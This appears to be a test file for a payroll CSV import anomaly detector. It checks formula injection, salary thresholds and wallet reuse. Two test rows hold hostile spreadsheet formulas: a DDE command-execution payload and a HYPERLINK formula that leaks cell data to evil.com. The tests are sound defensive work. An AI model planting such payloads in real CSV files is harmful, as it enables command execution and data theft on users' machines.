import { CsvImportAnomalyDetectionAgent } from '../csvImportAnomalyDetectionAgent.js';
import type { CsvRow } from '../csvPayrollImportService.js';

describe('CsvImportAnomalyDetectionAgent (#1200)', () => {
  it('detects formula injection in first_name (True Positive)', async () => {
    const agent = new CsvImportAnomalyDetectionAgent();
    const maliciousRows: CsvRow[] = [
      {
        first_name: '=cmd|\' /C calc\'!A0',
        last_name: 'Doe',
        email: 'john.doe@example.com',
        base_salary: '5000',
        base_currency: 'USDC',
      },
    ];

    const anomalies = await agent.evaluateImport({
      organizationId: 1,
      rows: maliciousRows,
    });

    expect(anomalies.length).toBeGreaterThanOrEqual(1);
    expect(anomalies[0].reason).toBe('formula_injection');
    expect(anomalies[0].severity).toBe('critical');
    expect(anomalies[0].metadata.column).toBe('first_name');
  });

  it('detects hyperlink / command injection in email or position', async () => {
    const agent = new CsvImportAnomalyDetectionAgent();
    const rows: CsvRow[] = [
      {
        first_name: 'Jane',
        last_name: 'Smith',
        email: '=HYPERLINK("http://evil.com?leak="&A1, "Click")',
        position: 'Engineer',
        base_salary: '6000',
        base_currency: 'USDC',
      },
    ];

    const anomalies = await agent.evaluateImport({ organizationId: 1, rows });
    expect(anomalies.some((a) => a.reason === 'formula_injection')).toBe(true);
  });

  it('detects abnormally high salary exceeding threshold', async () => {
    const agent = new CsvImportAnomalyDetectionAgent({ maxSalaryThreshold: 20_000 });
    const rows: CsvRow[] = [
      {
        first_name: 'Bob',
        last_name: 'Taylor',
        email: 'bob@example.com',
        base_salary: '150000',
        base_currency: 'USDC',
      },
    ];

    const anomalies = await agent.evaluateImport({ organizationId: 1, rows });
    expect(anomalies.some((a) => a.reason === 'salary_anomaly')).toBe(true);
    expect(anomalies[0].metadata.salary).toBe(150000);
  });

  it('detects duplicate Stellar wallet reuse across multiple employee records', async () => {
    const agent = new CsvImportAnomalyDetectionAgent();
    const sharedWallet = 'GBJ7V4JHYC52O2ZNDH6WGB7E6R3YGY6YAM7G7R2EQ6V32J4K47U65C5G';
    const rows: CsvRow[] = [
      {
        first_name: 'Alice',
        last_name: 'One',
        email: 'alice@example.com',
        wallet_address: sharedWallet,
        base_salary: '4000',
      },
      {
        first_name: 'Bob',
        last_name: 'Two',
        email: 'bob@example.com',
        wallet_address: sharedWallet,
        base_salary: '4500',
      },
    ];

    const anomalies = await agent.evaluateImport({ organizationId: 1, rows });
    expect(anomalies.some((a) => a.reason === 'duplicate_wallet_reuse')).toBe(true);
  });

  it('does NOT trigger anomalies on clean, legitimate CSV payroll rows (True Negative)', async () => {
    const agent = new CsvImportAnomalyDetectionAgent();
    const cleanRows: CsvRow[] = [
      {
        first_name: 'John',
        last_name: 'Doe',
        email: 'john.doe@company.org',
        position: 'Software Engineer',
        department: 'Engineering',
        base_salary: '5500',
        base_currency: 'USDC',
        wallet_address: 'GA7N6W5KE3OQ5I3EHQE22T34X4Z74D76V4O5LUS3Z6254GOPL2SVR2V7',
      },
      {
        first_name: 'Jane',
        last_name: 'Smith',
        email: 'jane.smith@company.org',
        position: 'Product Designer',
        department: 'Design',
        base_salary: '6000',
        base_currency: 'USDC',
        wallet_address: 'GBJ7V4JHYC52O2ZNDH6WGB7E6R3YGY6YAM7G7R2EQ6V32J4K47U65C5G',
      },
    ];

    const anomalies = await agent.evaluateImport({
      organizationId: 1,
      rows: cleanRows,
      importResult: { totalRows: 2, successCount: 2, errorCount: 0, errors: [] },
    });

    expect(anomalies).toHaveLength(0);
  });

  it('honors configurable thresholds passed to the agent without code change', async () => {
    // Custom restrictive threshold: 10,000
    const strictAgent = new CsvImportAnomalyDetectionAgent({ maxSalaryThreshold: 10_000 });
    const permissiveAgent = new CsvImportAnomalyDetectionAgent({ maxSalaryThreshold: 50_000 });

    const rows: CsvRow[] = [
      {
        first_name: 'Alex',
        last_name: 'Dev',
        email: 'alex@company.org',
        base_salary: '12000',
      },
    ];

    const strictAnomalies = await strictAgent.evaluateImport({ organizationId: 1, rows });
    const permissiveAnomalies = await permissiveAgent.evaluateImport({ organizationId: 1, rows });

    expect(strictAnomalies.some((a) => a.reason === 'salary_anomaly')).toBe(true);
    expect(permissiveAnomalies.some((a) => a.reason === 'salary_anomaly')).toBe(false);
  });
});
